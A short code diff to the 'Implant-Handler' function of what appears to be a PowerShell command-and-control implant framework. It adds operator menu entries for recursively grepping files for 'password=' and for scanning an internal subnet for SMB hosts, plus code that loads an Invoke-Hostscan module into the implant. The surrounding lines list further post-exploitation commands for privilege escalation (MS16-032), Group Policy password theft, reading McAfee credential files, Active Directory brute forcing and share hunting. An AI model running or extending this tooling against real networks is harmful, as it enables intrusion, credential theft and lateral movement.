@@ -140,6 +140,7 @@ function Implant-Handler
         write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
         write-host " Get-GPPPassword" -ForegroundColor Green 
         write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
+        write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
         write-host `n "File Management: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Download-File -Source C:\Temp\Run.exe" -ForegroundColor Green
@@ -163,6 +164,7 @@ function Implant-Handler
         write-host " Get-NetForest | Get-NetForestTrust | Get-NetForestDomain " -ForegroundColor Green
         write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
+        write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
         write-host " Invoke-ShareFinder -CheckShareAccess" -ForegroundColor Green
         write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
         write-host " Brute-AD" -ForegroundColor Green 
@@ -645,6 +647,10 @@ $error.clear()
             if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
             { 
                 CheckModuleLoaded "Powerup.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
+            { 
+                CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('get-recentfiles'))
             { 
